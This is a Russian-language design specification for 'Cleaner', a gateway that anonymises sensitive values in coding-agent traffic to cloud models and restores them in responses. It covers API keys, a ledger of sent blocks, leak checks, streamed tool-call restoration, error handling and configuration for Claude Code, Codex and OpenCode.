## 1. Зачем

Владелец хочет (28.10.2026) две вещи на одном ядре:

1. **API для других проектов** — очищать и восстанавливать текст из своих скриптов и служб, а не только из браузера.
2. **Cleaner в разрыве между агентом и моделью** — любой агент для написания кода (Claude Code, Codex, OpenCode и любой другой, у которого можно сменить адрес модели) ходит в облачную модель через Cleaner. Агент читает настоящие файлы, журналы и конфигурации; модель видит их с заменами; ответ модели — текст и вызовы инструментов — возвращается агенту с настоящими значениями, и агент правит файлы и выполняет команды как обычно.

Сразу во всех вариантах доступа к модели: по ключам подключений Cleaner (DeepSeek, MiniMax, OpenCode Go и т. п.), по подписке Claude (Claude Code с входом claude.ai) и по подписке ChatGPT (Codex с входом ChatGPT).

ТЗ (раздел 3) уже называло «OpenAI-совместимый прокси для скриптов и IDE» возможным развитием на том же ядре, а основная спецификация (раздел 1, п. 2) — «тонким входом в ядро». Сейчас входа для программ нет: все маршруты — HTML-формы со входом по cookie.

## 2. Цели, не-цели, анти-цели

**Цели**

- G1. JSON-API с ключами доступа: чат, очистка текста и файла, восстановление, таблица соответствий, правила.
- G2. Шлюз для агентов с протоколами Anthropic Messages, OpenAI Responses и OpenAI Chat Completions: потоковый ответ, вызовы инструментов, параллельные запросы, длинная история.
- G3. Три вида доступа к модели за шлюзом: подключение Cleaner (ключ хранится в Cleaner), подписка Claude, подписка ChatGPT (ключ или токен агента пробрасывается).
- G4. Видимость задним числом: что агент отправил, что заменено, — в веб-интерфейсе; правила, заданные там, действуют на следующие запросы.

**Не-цели**

- Подтверждение каждого запроса человеком (решение владельца, раздел 3).
- Передача модели изображений и файлов (FR-8.8 для них остаётся: такой блок удерживается, раздел 7.4).
- Перевод между протоколами: Codex говорит только на Responses и работает с моделями, у которых он есть (подписка ChatGPT, OpenAI API, модели OpenCode Go на `/v1/responses`).
- Протокол WebSocket Codex — только HTTP с потоком событий (раздел 9.3).
- Выбор и переключение провайдеров по нагрузке, повторы, кэширование ответов.
- Изменение кода агентов: всё делается их настройками.

**Анти-цели** — провалом считается, даже если «работает»:

- агент записал в настоящий файл подмену или метку вместо значения, которое было в файле, или не смог найти строку для правки из-за замены (раздел 11);
- известный оригинал ушёл наружу (SEC-2) — в том числе через поля, которые шлюз «не понял»;
- сессия агента падает от того, что шлюз изменил уже отправленную историю (подписи рассуждений, раздел 7);
- шлюз заметно замедляет агента: целевые числа — раздел 13;
- шлюз стал открытым ретранслятором: токен подписки или ключ подключения можно использовать без ключа Cleaner.

## 3. Решения владельца (28.10.2026)

1. Работа агента — без подтверждения каждого запроса; экран проверки — для просмотра задним числом.
2. Аргументы вызовов инструментов восстанавливаются полностью, включая секреты: файл и команда остаются на машине агента.
3. Нужны оба семейства протоколов — Anthropic и OpenAI, с потоковым ответом и инструментами.
4. Для агентов по умолчанию — слои 1–3 и словарь организации; слои 4 и 5 включаются для ключа явно.
5. Все виды доступа к модели: ключи подключений, подписка Claude, подписка ChatGPT.

## 4. Ограничения

- Остаются в силе все `SEC-…` ТЗ, кроме отступлений из таблицы ниже, и правила зависимостей основной спецификации (раздел 2): сетевые библиотеки — только в `egress` и `local_llm`; `core` не зависит от `web`, `storage`, `egress`.
- Единственный выход (SEC-1): к провайдеру уходит только объект, собранный `pipeline`, и `egress` сам повторяет проверку утечек (SEC-2).
- Python 3.12, без LiteLLM (SEC-14), зависимости — по хэшам и с карантином 14 дней.
- Быстрый набор тестов — 60 с (NFR-8).

Отступления от ТЗ для шлюза агентов (только для запросов по ключу шлюза; веб-интерфейс и `/api/v1` работают по ТЗ):

## 5. Устройство

```
 Агент ──HTTPS──▶ web/routes_agent.py ──▶ agent_service ──▶ core/agent/* (обход тел, журнал, восстановление потока)
                                               │                  │
                                               │                  └──▶ pipeline.sanitize / leakcheck / restore
                                               ▼
                                    pipeline.build_agent_outgoing() ──▶ egress.forward ──HTTPS──▶ провайдер
                                               ▲
 Проект ──HTTPS──▶ web/routes_api.py ──▶ ChatService (как веб-интерфейс)
```

| Модуль | Что делает | Видит оригиналы | Сеть |
|---|---|---|---|
| `core/agent/walk.py` | обход тела запроса и ответа по протоколу: какие строки — текст, какие — непрозрачные, какие — служебные | да | нет |
| `core/agent/ledger.py` | правила журнала отправленного (раздел 7): отпечаток блока, повтор, заморозка | да | нет |
| `core/agent/stream.py` | восстановление потока событий: текст — по мере прихода, аргументы инструментов — целиком (раздел 10) | да | нет |
| `core/pipeline.py` | новая `build_agent_outgoing()` и тип `AgentOutgoing` | да | нет |
| `egress/forward.py` | отправка `AgentOutgoing`, приём потока байтов; адаптеры заголовков по виду доступа | нет | только адреса подключений и закреплённые адреса подписок |
| `agent_service.py` | ключ → чат → блокировка чата → очистка → запись → отправка → восстановление → журнал | да | нет |
| `web/routes_agent.py`, `web/routes_api.py` | маршруты, проверка ключа, ошибки в виде протокола | да | входящие |

`AgentOutgoing` (неизменяемый, создаётся только в `pipeline`, как `OutgoingContext`): чат, вид доступа и подключение, путь, заголовки для провайдера, итоговое тело JSON, пути непрозрачных и замороженных строк (их проверка утечек пропускает, раздел 7.3). Тест состава программы (SEC-1) распространяется на `egress.forward`: другого входа у него нет.

Шлюз и API живут в той же службе и на том же порту, что веб-интерфейс (5464, TLS по SEC-8). Маршруты: `/agent/anthropic/…`, `/agent/openai/…`, `/api/v1/…`. Для них нет cookie, CSRF и HTML-страниц ошибок; заголовки безопасности остаются.

Сделано планом 5Б (28.10.2026), с уточнениями. `AgentOutgoing` несёт не пути замороженных строк, а сами новые и служебные строки (`checked`): их одним проходом проверяют и ядро, и `egress.forward` (`pipeline.checked_leaks`), повторённые блоки в проверку не входят. Заголовки агента — по списку раздела 9.1, значение не из ASCII отбрасывается. Состояние чата шлюза держится в памяти по версии чата (не больше восьми чатов); поток ответа и `egress` читают его снимок, снятый под замком, — следующий запрос того же чата таблиц не меняет у них на глазах. Пул шлюза — постоянная `AGENT_WORKERS = 8` в `web/app.py`, в нём идут и обработка запроса, и чтение потока ответа.

## 6. Ключи доступа и чаты

### 6.1. Ключи (FR-13.1)

- Ключ — `ck_` и 43 знака base64url (256 бит). Хранится хэш SHA-256 (как токен сессии), показывается один раз при создании; в списке — имя и последние четыре знака.
- Таблица `api_keys`: `id`, `user_id`, `name_enc`, `token_hash`, `tail`, `upstream` (`NULL` — только `/api/v1`; `provider:<id>`; `claude-subscription`; `chatgpt-subscription`), `models` (для `provider:` — какие модели подключения разрешены, пусто — все), `layers` (слои 4 и 5 вкл./выкл.), `chat_id` (чат шлюза), `created_at`, `last_used_at`, `disabled`.
- Ключ создаёт и отзывает его владелец на странице «Ключи»; администратор видит ключи всех (без значений) и может отключить любой. Ключ с доступом по подписке (`claude-subscription`, `chatgpt-subscription`) создаёт только администратор (решение владельца, раздел 19). Отключённая учётная запись — все её ключи не действуют. Смена пароля ключи не отзывает (моё решение: ключ — отдельный секрет агента).
- Ключ передаётся заголовком `X-Cleaner-Key`. Для доступа по подключению Cleaner допускается и `Authorization: Bearer ck_…` или `x-api-key: ck_…` — так проще настраивать агентов (раздел 14). Для подписок — только `X-Cleaner-Key`: `Authorization` принадлежит провайдеру.
- Неверный ключ — 401 в виде протокола, нарастающая пауза по адресу клиента (как `Throttle` входа), событие `api_auth_failed` в журнале.
- Сделано планом 5А (28.10.2026), с двумя отличиями от написанного выше. Таблица `api_keys` в схеме версии 7 — без столбцов шлюза (`upstream`, `models`, `layers`, `chat_id`): их добавит миграция плана 5Б вместе с кодом, который их читает. Ключ отзывается насовсем («Отключить»): включить отозванный нельзя, выпускается новый — хранить у отозванного нечего, кроме хэша. Отказ из-за паузы (429) ключ не проверяет и в журнал не пишется.
- План 5Б (28.10.2026): столбцы шлюза — в схеме версии 8. Доступ ключа к модели (`upstream`, `models`) задаётся при создании и не меняется: другой доступ — новый ключ. Из нескольких присланных ключей (`X-Cleaner-Key`, `Bearer`, `x-api-key`) берётся первый вида `ck_…` — у агента с подпиской в `Authorization` его собственный токен; это действует и для `/api/v1`. Проверка «подключение включено, протокол Anthropic, модели из его списка» — общая для формы и команды (`agent_service.gateway_access`).
- План 5В (29.10.2026): `gateway_access(repo, access, models, admin=…)` принимает подключение любого протокола шлюза (Anthropic, OpenAI Chat Completions, OpenAI Responses) и подписку — только при `admin`; модели подписки — свободным списком (пусто — все). У формы подписки и поле моделей видит только администратор, команда — `apikey add … --subscription claude|chatgpt`. Роль владельца проверяется и при каждом запросе по подписке.

### 6.2. Чаты API

`/api/v1` работает с обычными чатами владельца ключа: они видны в интерфейсе, как созданные в браузере (FR-1.3, FR-1.5), и очищаются той же `ChatService`.

### 6.3. Чат шлюза

- У каждого ключа шлюза есть текущий чат (`chats.kind = 'agent'`, название «Агент: <имя ключа>, <дата>»). Таблица соответствий общая для всех разговоров и субагентов, начатых в этом чате.
- Почему не чат на разговор: Codex хранит рассуждения и сжатие истории зашифрованными у провайдера — в них замены остаются на весь разговор и после его возобновления; субагенты и фоновые запросы Claude Code идут параллельно и должны видеть те же замены; памятные файлы агента (`CLAUDE.md`, `AGENTS.md`) читаются в каждом разговоре — постоянные замены сохраняют кэш промптов провайдера.
- **Разговор** — последовательность запросов с одной и той же историей. Его отпечаток — HMAC первого сообщения пользователя (оригинала) вместе с ключом: заголовок сессии есть не у всех агентов и не переживает возобновления, а первое сообщение агент пересылает дословно при каждом ходе и после возобновления. Сжатие истории агентом начинает новый разговор. Заголовки `x-claude-code-session-id` и `session-id` записываются для просмотра.
- Разговор привязан к чату, в котором начался, до своего конца: замены в его истории не меняются. Новые разговоры идут в текущий чат ключа.
- Текущий чат сменяется новым сам — через 30 дней или при 20 000 сущностей (моё решение; пороги — настройки), и кнопкой «Начать заново» (FR-5.2 по желанию). Прежний чат доживает, пока в нём идут разговоры, и удаляется, когда журнал его разговоров истёк (7.3), — так состояние чата не растёт месяцами.
- Чат шлюза создаётся в «режиме написаний» (раздел 11): признак в состоянии чата, а не в ключе.
- Как сделано планом 5Б: пороги смены чата — постоянные `AGENT_CHAT_DAYS = 30` и `AGENT_CHAT_ENTITIES = 20_000` в `agent_service.py`, а не настройки: менять их пока некому. Возраст проверяется, когда новый разговор ищет текущий чат; размер — после записи запроса: чат, дошедший до порога, перестаёт быть текущим у ключа. Отпечаток разговора — по первому сообщению пользователя, блоками без `cache_control` (строка — как один блок `text`): так он тот же и у агента, который ставит `cache_control` на последний блок пользователя. Таблицы разговоров и журнала не несут `chat_id`: чат журнала — через его разговор.

## 7. Журнал отправленного

### 7.1. Зачем

API Anthropic сверяет подпись блока рассуждений со всем, что шло до него: системной частью, инструментами и каждым предыдущим сообщением; изменённая история — отказ 400. Codex и Claude Code при каждом ходе пересылают всю историю (Codex — `store: false`). Провайдеры кэшируют промпт по точному префиксу. Значит, однажды отправленный блок должен уходить при следующих ходах побайтно тем же, а очищать каждый раз всю историю заново (сотни тысяч знаков) ещё и медленно.

### 7.2. Как устроен

Таблица `agent_ledger` (на чат, всё зашифровано ключом чата):

| Поле | Что |
|---|---|
| `chat_id`, `conversation`, `digest` | разговор (6.3) и отпечаток блока: HMAC-SHA256 ключом, выведенным из ключа чата, по протоколу, роли, виду блока и каноническому JSON содержимого. Открытый хэш не годится: по нему подбирается известный пароль. Повтор ищется только внутри своего разговора: новый разговор очищает системную часть и памятные файлы заново, с текущими правилами |
| `direction` | `in` — блок агента (оригинал → как ушёл); `out` — блок модели (как отдан агенту → как пришёл от модели) |
| `local_enc` | содержимое блока со стороны агента |
| `wire_enc` | содержимое блока со стороны провайдера |
| `session`, `first_seen`, `last_seen`, `state_version`, `counts` | для просмотра и очистки |

Правила:

1. **Блок агента** (системная часть, сообщение пользователя, результат инструмента, описание инструмента): есть в журнале — уходит `wire` дословно; нет — очищается с текущим состоянием чата, проходит проверки (раздел 8, шаг 6) и записывается.
2. **Блок модели в истории** (текст ассистента, вызов инструмента): ищется по тому, что шлюз отдал агенту (`direction = out`); найден — уходит то, что прислала модель, дословно. Не найден (агент изменил или сжал историю) — очищается как ответ модели в чате: только известные значения, словарь и правила (FR-8.11), новых сущностей не создаёт.
3. **Подписанные и непрозрачные рассуждения модели** (`thinking`, `redacted_thinking`, подписи, `encrypted_content`, `compaction`) шлюз не трогает ни в ответе, ни в истории: агент видит их с заменами. Неподписанный текст `reasoning_content` (Chat Completions) и `reasoning.summary` (Responses) при первом появлении в истории обрабатывается как блок модели по правилу 2: известные значения, словарь и правила, затем запись в `out`. При повторе берётся замороженный вид из журнала. В Responses очищается только `summary`; соседние `encrypted_content`, `id` и `status` сохраняются. В ответе провайдера рассуждения передаются как пришли. Уточнение 31.10.2026 по задаче реализации IDEAS.md.
4. Детерминизм: та же строка при том же состоянии чата очищается одинаково; журнал нужен для случаев, когда состояние с тех пор выросло.

Как сделано планом 5Б: таблица `agent_ledger` — `conversation`, `direction`, `digest`, `local_enc`, `wire_enc` (AAD — вид столбца, разговор, направление и отпечаток), `withheld`, `counts`, `first_seen`, `last_seen`; сессия агента — в таблице разговоров `agent_conversations`, версия состояния не записывается. Запись `INSERT OR IGNORE`: блок, записанный параллельным запросом, остаётся первым — его вид уже ушёл провайдеру. Ключ отпечатков — HMAC ключа чата, ключ отпечатка разговора — HMAC общего ключа (`core/agent/ledger.py`).

### 7.3. Последствия, принятые сознательно

- Правило, заданное в интерфейсе (снять или назначить замену), и новое значение словаря действуют на новые блоки идущих разговоров и на всё в новых разговорах. Значение, которое ушло открытым до появления правила, уже ушло; переочистка истории идущего разговора его не вернёт, а разговор сломает. Экран чата шлюза показывает, в скольких замороженных блоках значение осталось открытым (как FR-6.8).
- Проверка утечек замороженные строки пропускает: проверены при первой отправке, а находка в них сейчас — значение, которое провайдер уже видел. Новые строки проверяются по полному составу сущностей (SEC-2).
- Разговор, к которому не обращались 30 дней, удаляется из журнала целиком (моё решение; ТЗ, решение 4, — про чаты, а журнал шлюза растёт с каждым прочитанным файлом). Возобновление разговора старше этого срока может получить отказ провайдера по подписи — тогда нужен новый разговор.

### 7.4. Блок, который нельзя отправить

Агент пересылает всю историю при каждом ходе, поэтому отказ из-за одного блока убил бы разговор навсегда. Блок, который нельзя отправить, **удерживается**: вместо него уходит постоянная пометка того же вида блока (текст «[Cleaner: блок не передан — <причина>]»; у результата инструмента — его содержимым), и пометка замораживается в журнале с признаком `withheld`. Причины:

- изображение, документ, файл (FR-8.8) — «изображение не передаётся»;
- фрагмент типа с политикой «блокировать» (FR-4.2) — «содержит значение типа <тип>»; значение не уходит ни в каком виде, как требует политика;
- слой 1–4 упал на этом блоке (FR-3.7) — «очистка не выполнена».

Модель видит пометку и может сказать о ней пользователю; в журнале — событие `agent_withheld` с причиной; экран чата шлюза показывает удержанные блоки. Утечка, найденная проверкой после очистки (SEC-2), — ошибка самого Cleaner: запрос целиком не уходит (раздел 12).

## 8. Обработка запроса шлюзом

1. **Ключ** → запись ключа → вид доступа → чат. Модель из тела сверяется с `models` ключа.
2. **Тело**: распаковка `Content-Encoding: gzip` и `deflate` (Claude Code сжимает тела по умолчанию) с пределом распакованного размера; `zstd` — отказ 415 с подсказкой выключить сжатие в агенте (моё решение: без новой зависимости; Codex сжимает только встроенным провайдером, а он шлюзу не нужен). Предел тела после распаковки — 32 МиБ (настройка `agent_max_body_mb`).
3. **Обход** (`walk.py`): каждая строка тела относится к одному из видов:
   - *текст* — очищается: системная часть, текст сообщений, результаты инструментов, аргументы вызовов в истории, описания инструментов и их схемы (кроме служебных ключей схемы);
   - *непрозрачное* — передаётся как есть и не проверяется: подписанные рассуждения, подписи, `encrypted_content`, идентификаторы блоков и вызовов (`id`, `tool_use_id`, `call_id`), блок атрибуции Claude Code (раздел 9.1); неподписанный текст — по 7.2.3;
   - *служебное* — передаётся как есть и проверяется на утечки: `model`, `role`, `type`, имена инструментов, `cache_control`, `metadata`, параметры (`max_tokens`, `temperature`, `reasoning`, `stream`, `tool_choice`…).
   Строка под незнакомым ключом считается текстом — неизвестное поле очищается, а не пропускается. Блок незнакомого типа обходится так же. Блоки `image`, `document`, `input_image`, `input_file`, `file` и любой `source` с `base64`/`url` удерживаются (7.4).
4. **Блокировка чата** (в памяти процесса, на чат) — на шаги 5–7: параллельные запросы одного ключа не выдают одной сущности две замены. Отправка и поток ответа идут уже вне блокировки.
5. **Очистка** новых блоков (раздел 7.2) слоями ключа; блоки модели из истории — по правилу 7.2.2. Блоки очищаются по отдельности, а не склейкой: каждый — своя запись журнала.
6. **Проверки** новых блоков: фрагмент типа с политикой «блокировать» (FR-4.2) или отказ слоя 1–4 на блоке (FR-3.7) — блок удерживается (7.4); слой 5 или локальная модель недоступны — запрос не уходит, ошибка 503 (агент повторит); утечка (SEC-2) в итоговых новых и служебных строках — запрос не уходит, ошибка 400 с числом находок, без значений.
7. **Запись** состояния чата и новых записей журнала `in` — одной транзакцией с проверкой версии (`commit_chat`); `StaleState` (чат изменили в интерфейсе) — повтор шагов 5–7, до трёх раз.
8. **Служебная инструкция** (раздел 10.2 основной спецификации) добавляется последним блоком системной части: у Anthropic — последний элемент `system` (строка `system` дополняется через пустую строку); у Responses — последним сообщением `developer` перед первым сообщением пользователя; у Chat Completions — последним сообщением `system` перед первым сообщением пользователя. Текст постоянный — префикс не меняется от запроса к запросу.
9. **Сборка** `AgentOutgoing` в `pipeline` и **отправка** `egress.forward`: повторная проверка утечек по новым и служебным строкам, адрес и заголовки по виду доступа (раздел 9), без переадресаций, повторов и прокси из окружения.
10. **Ответ**: восстановление потока (раздел 10), затем записи журнала `out` и событие `agent_send` в журнале (FR-11.1): ключ, вид доступа, модель, число блоков новых и повторённых, число замен по типам, счётчики восстановления, код ответа провайдера. Без текста.

Как сделано планом 5Б (28.10.2026):

- Предел тела — постоянная 32 МиБ (`AGENT_BODY_BYTES` в `web/deps.py`), а не настройка `agent_max_body_mb`; распаковка `gzip` и `deflate` (с обёрткой zlib и без) — с тем же пределом распакованного. Строка с непарной половиной суррогатной пары (`\ud800`) — отказ 400: её не записать ни в базу, ни в запрос.
- Слой 5, отказавший посреди очистки, — 503 для всего запроса (агент повторит); исключение слоёв 1–4 на блоке — удержание «очистка не выполнена». Три `StaleState` подряд — 503.
- Блок модели, которого нет в журнале `out` (журнал истёк, агент изменил историю), очищается как ответ модели и записывается в журнал `out` той же транзакцией, что и новые блоки агента: в следующих ходах он повторяется дословно. Незнакомый блок ассистента — блок агента: очищается слоями ключа.
- Незнакомое поле верхнего уровня тела — единица `params` и очищается как текст; строки известных параметров (`thinking`, `context_management`, `output_config` и др.) — служебные и проверяются на утечки.
- Событие `agent_withheld` — одно на запрос, с числом удержанных блоков по причинам; `agent_refused` — с причиной `leak`, `leak_structural` или `leak_egress`. Ещё два события: `agent_chat_created` (новый чат шлюза) и `agent_pruned` (удалены осиротевшие чаты).

## 10. Восстановление в ответе

### 10.1. Текст

Дельты текста (`text_delta`, `response.output_text.delta`, `choices[].delta.content`) восстанавливаются по мере прихода. Новый `DeltaRestorer` в `core/agent/stream.py` на основе `StreamRestorer`: держит хвост после последнего пробельного знака (замена пробелов не содержит; хвост без пробелов длиннее 512 знаков отдаётся до последнего знака, не входящего в запись замены — как сейчас) и отдаёт только прирост. Правило ссылок FR-7.8 для текста шлюза не применяется (моё решение: терминал агента не загружает ссылки, а без этого правила восстановление префикса монотонно). Условие корректности: склейка отданных дельт равна восстановлению всего текста — проверяется свойством на случайных разрезах (как AC-3.3).

Политики в тексте — как в чате: секреты остаются метками (FR-7.7); в аргументах инструментов — восстанавливаются (10.3).

Итоговые объекты ответа, в которых модель повторяет весь текст (`response.output_item.done`, `response.completed`, ответ без потока), получают тот же восстановленный текст, что и склейка дельт: Codex кладёт в историю именно `output_item.done`.

### 10.2. Вызовы инструментов

Аргументы копятся до конца блока и отдаются один раз, восстановленными:

- Anthropic: `content_block_start` с `tool_use` пересылается сразу (`input: {}`), `input_json_delta` копятся, на `content_block_stop` — разбор JSON, восстановление (10.3), одна дельта `input_json_delta` с полным JSON, затем `content_block_stop`. `ping` идут всё это время.
- Chat Completions: дельты `tool_calls[i].function.arguments` копятся по `index`; первая часть каждого вызова (с `id` и `name`) пересылается с пустыми аргументами; перед частью с `finish_reason` — одна часть с полными восстановленными аргументами каждого вызова.
- Responses: `response.function_call_arguments.delta` и `response.custom_tool_call_input.delta` копятся и не пересылаются (Codex их только показывает); `…done`, `response.output_item.done` и `response.completed` получают восстановленные `arguments` и `input`. Для `apply_patch` (свободный текст патча) — одна дельта `custom_tool_call_input.delta` с восстановленным патчем перед `done`, чтобы предпросмотр не был пустым.
- Аргументы-JSON восстанавливаются по разобранному объекту: каждая строка-значение отдельно, ключи не трогаются, затем сериализация. Обратная косая черта в `DOMAIN\login` и кавычки так экранируются правильно. Незаконченный JSON (обрыв) — пересылается как есть.
- Шлюз записывает пару «отдано агенту → пришло от модели» в журнал (`out`) для каждого текста и вызова.

### 10.3. Точное восстановление в аргументах

`restore_exact(state, text)`: только точные записи выданных замен, без искажённых форм FR-7.3 (в коде `PERSON_1` без скобок может быть настоящим именем); выведенные адреса и имена (FR-7.6) — восстанавливаются: модель, назначив новому узлу адрес в условной подсети, имеет в виду настоящую подсеть. Политика «без восстановления» не действует — восстанавливается всё (решение владельца 2). Правило ссылок FR-7.8 в аргументах тоже не действует: замена внутри адреса ссылки в `old_string` правки или в строках контекста патча не совпала бы с файлом (анти-цель 1). Цена — раздел 17, риск 1.

## 11. Точное написание

Проверка 28.10.2026 на нынешнем ядре: очистка и восстановление возвращают e-mail `ivan.petrov@contoso.ru` как `Ivan.Petrov@Contoso.RU` (первое встреченное написание), телефон `89161234567` как `+7 916 123-45-67`, адрес `010.001.002.005` как `10.1.2.5`. Для чата так и задумано (FR-5.3). Агенту — нет: модель копирует строку из очищенного файла в аргумент правки, восстановление даёт другое написание, правка не находит строку или пишет в файл не то, что там было.

Требование (FR-14.6): в чате в режиме написаний для любой строки `t`, очищенной в этом чате, `restore_exact(state, sanitize(state, t)) == t` — включая секреты. Проверяется свойством на порождённом наборе (все типы, разные регистр, формат записи телефона, нули в адресах, запись MAC и IPv6, `DOMAIN\login` и путь профиля, значения словаря с вариантами написания) и на примерах выше.

Как добиться — решает исполнитель; рекомендация:

- метки: ключ сущности в режиме написаний — точное написание, без сведения регистра и формата; два написания одного адреса — две метки (`<EMAIL_1>`, `<EMAIL_2>`). Модель теряет подсказку «это одно и то же» — плата за точность;
- подмены: адрес IPv4 с нулями впереди получает подмену в той же записи (`010.125.180.005`); регистр шестнадцатеричных цифр IPv6 и MAC, разделители MAC (уже так) и регистр имён узлов и доменов повторяются в подмене, а восстановление возвращает запись оригинала;
- значения словаря с вариантами написания (FR-10.1): каждый вариант — своя замена;
- слой 4 для ключа шлюза, если включён, — каждая падежная форма своя метка.

Режим написаний включается признаком состояния чата; чаты интерфейса и `/api/v1` работают как раньше. В чате шлюза нет правок «изменить значение для восстановления» и «объединить сущности» (FR-6.4): обе сводят разные написания к одному и ломают требование выше. Снять замену, назначить замену и сменить тип — есть.

Как сделано планом 5Б (28.10.2026): `ChatState.written`; ключ сущности с меткой — точное значение, без сведения регистра и формата, без вариантов словаря и без сведения упоминаний людей; у имён узлов, доменов и NetBIOS и их частей — точное написание с регистром. Адрес IPv4 и IPv6 в записи, отличной от канонической не только разделителем `\.`, получает метку `IP`, а не подмену в той же записи: подмена совпала бы с подменой канонической записи. `restore.originals(state, settings, exact=True)` — точное восстановление аргументов: без искажённых записей меток и с «скрывать без восстановления», читаемым как «скрывать и восстанавливать». Требование проверено на примерах выше и на 200 порождённых текстах (`tests/test_written.py`); назначить замену в чате шлюза в интерфейсе нельзя — у него нет текстов, к которым её привязать (экран проверки), — снять замену и сменить тип можно в таблице замен.

## 12. Ошибки шлюза

Ответ — в виде протокола агента (`{"type":"error","error":{"type":…,"message":…}}` у Anthropic, `{"error":{"message":…,"type":…,"code":…}}` у OpenAI), сообщение начинается с «Cleaner:» и не содержит текста запроса.

| Случай | Код | Повторит ли агент |
|---|---|---|
| нет или неверный ключ, ключ отключён | 401 | нет |
| модель не разрешена ключу, протокол не тот, утечка после очистки | 400 | нет |
| изображение или файл, политика «блокировать», слой 1–4 упал на блоке | не ошибка: блок удерживается (7.4) | — |
| слой 5 или шлюз локальной модели недоступен | 503 с `Retry-After: 10` | да |
| `zstd` | 415 | нет |
| WebSocket | 426 | Codex переходит на HTTP |
| провайдер ответил ошибкой | код и тело провайдера как есть (оно содержит только очищенный текст), заголовок `Retry-After` — тоже | по коду (429, 529, 5xx — да) |
| провайдер недоступен, тайм-аут | 502 / 504 | да |
| ошибка посреди потока | событие `error` протокола, затем закрытие | по правилам агента |

Каждый отказ шлюза — событие журнала с причиной и числами.

Как сделано планом 5В (29.10.2026): под `/agent/openai/` ошибки — `{"error": {"message": "Cleaner: …", "type", "code": null}}`, тип по коду: 400, 405, 413, 415 — `invalid_request_error`, 401 — `authentication_error`, 403 — `permission_error`, 404 — `not_found_error` (и незнакомый путь), 429 — `rate_limit_error`, 5xx — `server_error`. Посреди потока — у Chat Completions часть `data: {"error": …}`, у Responses — событие `error`. Строки 426 нет: WebSocket Codex не открывает (9.3). У подписки: 403 — владелец ключа не администратор, 401 — агент не прислал вход подписки.

Как сделано планом 5Г (30.10.2026): событие `agent_refused` с полем `reason` пишется на каждый отказ шлюза, а не только на утечки, как в 5Б и 5В. Причины: `no_upstream` (403), `connection_gone` (400), `model` (400), `protocol` (400), `subscription_role` (403), `subscription_login` (401), `layer_down` (503, и когда слой упал посреди очистки), `busy` (503, состояние чата так и не удалось записать), `body` (400, 413, 415 — разбор тела); `leak`, `leak_structural`, `leak_egress` — как раньше, с числом. В событии — пользователь, ключ (номер, не значение) и чат, если он уже известен; текста запроса нет. Тело с вложенностью глубже 64 уровней — 400 в виде протокола (проверка без рекурсии), причина `body`. Отказы `GET …/v1/models` (404 ключу с подпиской, 403 без доступа к модели) не пишутся: список моделей провайдеру ничего не передаёт.

## 13. Скорость (NFR-4, дополнение)

- Запрос, все блоки которого есть в журнале, — добавка шлюза не больше 300 мс (p95) при теле 1 МиБ на сервере; новое содержимое — по нормам NFR-4 для слоёв 1–3 (3 с на 100 000 знаков).
- Задержка первого знака текста — не больше добавки плюс одно слово; вызов инструмента приходит агенту целиком после его конца у модели.
- Параллельные запросы одного ключа ждут друг друга только на шагах 5–7 раздела 8.
- Состояние чата шлюза держится в памяти расшифрованным, пока не изменилась его версия в базе, а сборка восстановления (`_Restorer`) — пока не изменилось состояние: расшифровка и сборка на каждый запрос при тысячах сущностей съели бы добавку. ## 14. Настройка агентов

- **Claude Code**, ключ подключения Cleaner: режим `cleaner` в `claude-switch.ps1` (мастер в `claude-bundle`, комментарии на английском, адрес и ключ — из `.env`, не из скрипта): `ANTHROPIC_BASE_URL`, `ANTHROPIC_AUTH_TOKEN=<ck_…>`, `NODE_EXTRA_CA_CERTS=<сертификат Cleaner>`, `CLAUDE_CODE_ATTRIBUTION_HEADER=0`, модели — `ANTHROPIC_MODEL`, `ANTHROPIC_DEFAULT_{OPUS,SONNET,HAIKU}_MODEL`.
- **Claude Code**, подписка: режим `cleaner-sub`: `ANTHROPIC_BASE_URL`, `ANTHROPIC_CUSTOM_HEADERS="X-Cleaner-Key: <ck_…>"`, `NODE_EXTRA_CA_CERTS`; без `ANTHROPIC_AUTH_TOKEN` и `ANTHROPIC_API_KEY` (они заменяют вход claude.ai).
- **Codex**: свой провайдер в `~/.codex/config.toml` (раздел 9.3); подписка — `requires_openai_auth = true`, ключ подключения — `env_key`. Доверие сертификату — `CODEX_CA_CERTIFICATE` (или `SSL_CERT_FILE`) с файлом сертификата службы; сертификат — самоподписанный с `CA:FALSE`: сертификат УЦ сертификатом сервера rustls не принимает (проверка 18.4 5В).
- **OpenCode**: `provider.<id>.options.baseURL` и `options.headers` с `X-Cleaner-Key`; сертификат — `NODE_EXTRA_CA_CERTS`.
- Готовые фрагменты настройки показывает страница ключа после создания.
- Сертификат Cleaner самоподписанный (раздел 15 основной спецификации); агенту передаётся файл сертификата, а не отключение проверки.
- Как сделано планом 5В (29.10.2026): страница ключа показывает по виду доступа `settings.local.json` Claude Code (по ключу — как в 5Б; по подписке — `ANTHROPIC_CUSTOM_HEADERS` и ссылка на `claude-switch.ps1 cleaner-sub`), `config.toml` Codex с переменными `CLEANER_KEY` и `CODEX_CA_CERTIFICATE` (для подключения Responses и подписки ChatGPT), `opencode.json` и пример SDK OpenAI (для подключения Chat Completions). Режим `cleaner-sub` в `claude-switch.ps1` убирает и `apiKeyHelper` и переключатель атрибуции, модели не задаёт; `ANTHROPIC_CUSTOM_HEADERS` стал ключом переключателя — другие режимы его снимают.
- Как сделано планом 5Г (30.10.2026):
  - **Подключение к OpenCode Go.** Протокол `anthropic` — адрес `https://opencode.ai/zen/go`, способ входа `x-api-key` (`Authorization: Bearer` там — 401); `responses` и `openai` — `https://opencode.ai/zen/go/v1`, способ входа `bearer`. Заголовок сессии `x-opencode-session` (без него все три протокола отвечают 400 `MissingSessionID`) egress добавляет сам по узлу подключения (`cloud.SESSION_HEADERS`): значение — UUID из отпечатка разговора у шлюза, из чата — у отправки чата и проверки подключения; одно на разговор (кэш промпта провайдера), своё у каждого субагента, о содержании разговора ничего не говорит. Заголовок с тем же именем, присланный агентом, заменяется. Агенту и пользователю настраивать его не нужно.
  - **`GET /cert.pem`** — сертификат службы без входа (`application/x-pem-file`, файл `cleaner-cert.pem`; без TLS — 404; закрытый ключ не отдаётся никогда) — второе исключение AC-1.11 рядом с `/agent/anthropic/api/hello`: это то же, что любой клиент получает при TLS-соединении. Страница ключа ссылается на него, переносить сертификат на машину агента вручную больше не нужно.
